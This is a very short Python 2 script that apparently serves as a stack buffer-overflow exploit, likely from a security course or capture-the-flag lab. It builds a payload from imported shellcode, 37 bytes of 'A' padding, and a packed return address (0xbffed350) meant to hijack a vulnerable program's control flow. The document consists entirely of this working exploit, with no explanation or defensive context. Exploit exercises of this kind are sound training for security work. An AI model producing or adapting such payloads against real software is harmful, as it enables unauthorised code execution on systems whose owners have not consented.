from struct import pack
from shellcode import shellcode


print "\xff\xff\xff\xff"+shellcode+"A"*37+pack("<I",0xbffed350)
